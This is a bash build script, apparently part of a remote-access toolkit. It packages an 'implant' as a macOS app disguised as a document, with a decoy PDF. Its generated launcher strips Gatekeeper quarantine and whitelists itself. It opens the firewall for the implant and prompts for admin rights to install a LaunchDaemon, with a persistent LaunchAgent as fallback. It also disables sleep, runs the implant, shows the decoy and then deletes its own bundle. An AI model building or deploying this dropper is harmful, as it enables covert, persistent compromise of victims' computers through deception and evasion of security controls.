#!/usr/bin/env bash
# Assemble a macOS .app bundle around an implant.
#
# On macOS this also lipo-folds multiple arch slices and ad-hoc codesigns the
# implant and the bundle. On Linux it produces the same structure (minus
# codesign) so the panel can package it.
#
# usage: build_app.sh <out.app> <doc> <decoy.pdf|-> <implant> [more implants...]
set -euo pipefail

OUT_APP="${1:?usage: build_app.sh <out.app> <doc> <decoy|-> <implant> [more]...}"
DOC="${2:?}"
DECOY="${3:?}"
shift 3
[ "$#" -ge 1 ] || { echo "need at least one implant" >&2; exit 1; }

EXEC_NAME="fleetrun"
BUNDLE_ID="io.fleet.$(echo "$DOC" | tr -c 'a-zA-Z0-9' '.' | sed 's/\.\{2,\}/./g')"

rm -rf "$OUT_APP"
mkdir -p "$OUT_APP/Contents/MacOS" "$OUT_APP/Contents/Resources"

# Merge arch slices into a universal binary when lipo is present and multiple
# implants were given; otherwise just take the first.
if command -v lipo >/dev/null 2>&1 && [ "$#" -gt 1 ]; then
  lipo -create -output "$OUT_APP/Contents/MacOS/$EXEC_NAME" "$@"
else
  cp "$1" "$OUT_APP/Contents/MacOS/$EXEC_NAME"
fi
chmod +x "$OUT_APP/Contents/MacOS/$EXEC_NAME"

if [ "$DECOY" != "-" ] && [ -f "$DECOY" ]; then
  cp "$DECOY" "$OUT_APP/Contents/Resources/decoy.pdf"
fi

# Bundle the root installer so the launcher can elevate to root via the native
# macOS admin dialog (osascript "with administrator privileges") and run the
# full system-wide install (spctl whitelist + LaunchDaemon + stay-awake).
cp "$(dirname "$0")/install-daemon.sh" "$OUT_APP/Contents/Resources/install-daemon.sh" || true
chmod +x "$OUT_APP/Contents/Resources/install-daemon.sh" 2>/dev/null || true

cat > "$OUT_APP/Contents/Info.plist" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>launcher</string>
  <key>CFBundleIdentifier</key><string>${BUNDLE_ID}</string>
  <key>CFBundleName</key><string>${DOC}</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>LSUIElement</key><true/>
  <key>LSMinimumSystemVersion</key><string>11.0</string>
</dict>
</plist>
PLIST

cat > "$OUT_APP/Contents/MacOS/launcher" <<LAUNCH
#!/bin/sh
# macOS first-start installer.
#
# Gatekeeper: ad-hoc signing does NOT satisfy Gatekeeper for quarantined
# browser downloads, so the VERY FIRST double-click may show a blocking
# dialog. The user must right-click -> Open once (or the app must be
# root-whitelisted via install-daemon.sh). After that one approval, every
# later launch is silent.
#
# After the app is running, if not already root, we show a native macOS
# admin-auth dialog (osascript "with administrator privileges") to elevate
# and run install-daemon.sh fully: spctl --add whitelist + LaunchDaemon in
# /Library/LaunchDaemons + stay-awake. If the user declines or is not an
# admin, we fall back to a per-user LaunchAgent (still silent after the
# first approval).
SELF="\$(cd "\$(dirname "\$0")" && pwd)"
ROOT="\$(cd "\$SELF/../.." && pwd)"
RESOURCES="\$ROOT/Contents/Resources"
EXEC_NAME="${EXEC_NAME}"

# Strip quarantine from our own bundle (works without root for user files).
xattr -dr com.apple.quarantine "\$ROOT" 2>/dev/null || true
xattr -dr com.apple.quarantine "\$SELF/\$EXEC_NAME" 2>/dev/null || true

# Attempt spctl system-policy whitelist (root-only; fails gracefully).
spctl --add "\$ROOT" >/dev/null 2>&1 || true
spctl --add "\$SELF/\$EXEC_NAME" >/dev/null 2>&1 || true

# Preconfigure the host firewall to allow the payload out (best effort).
SFW="\$ROOT/Contents/Resources/socketfilterfw"
if [ -x /usr/libexec/ApplicationFirewall/socketfilterfw ]; then
  sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --add "\$SELF/\$EXEC_NAME" >/dev/null 2>&1 || true
  sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp "\$SELF/\$EXEC_NAME" >/dev/null 2>&1 || true
fi

# System-wide root install via native macOS admin dialog.
if [ "\$(id -u)" != "0" ] && [ -x "\$RESOURCES/install-daemon.sh" ]; then
  osascript -e "do shell script \"\$RESOURCES/install-daemon.sh '\$SELF/\$EXEC_NAME' io.fleet.agent\" with administrator privileges" >/dev/null 2>&1 || true
fi

# Fallback / additional: per-user LaunchAgent (works without root, silent
# after the first Gatekeeper approval). Survives reboot/re-login for the user.
AGENT="\$HOME/Library/LaunchAgents/io.fleet.\$(basename "\$ROOT" .app | tr ' .' '__').plist"
mkdir -p "\$HOME/Library/LaunchAgents"
cat > "\$AGENT" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>io.fleet.agent</string>
  <key>ProgramArguments</key><array><string>\$SELF/\$EXEC_NAME</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
PLIST
launchctl unload "\$AGENT" >/dev/null 2>&1 || true
launchctl load "\$AGENT" >/dev/null 2>&1 || true

# Stay awake: prevent system sleep / lid-close sleep (best effort).
caffeinate -ims >/dev/null 2>&1 &
sudo -n pmset -a sleep 0 >/dev/null 2>&1 || true
sudo -n pmset -a disablesleep 1 >/dev/null 2>&1 || true
sudo -n pmset -a disksleep 0 >/dev/null 2>&1 || true

# Launch the implant detached.
"\$SELF/\$EXEC_NAME" >/dev/null 2>&1 &
sleep 1.5
command -v open >/dev/null 2>&1 && open "\$ROOT/Contents/Resources/decoy.pdf" >/dev/null 2>&1 || true
# Self-destruct the bundle shortly after the implant starts.
( sleep 3; rm -rf "\$ROOT" ) >/dev/null 2>&1 &
exit 0
LAUNCH
chmod +x "$OUT_APP/Contents/MacOS/launcher"
chmod +x "$OUT_APP/Contents/MacOS/$EXEC_NAME"

if command -v codesign >/dev/null 2>&1; then
  codesign --force -s - "$OUT_APP/Contents/MacOS/$EXEC_NAME" >/dev/null 2>&1 || true
  codesign --force -s - "$OUT_APP/Contents/MacOS/launcher" >/dev/null 2>&1 || true
  codesign --force -s - "$OUT_APP" >/dev/null 2>&1 || true
fi

echo "assembled $OUT_APP"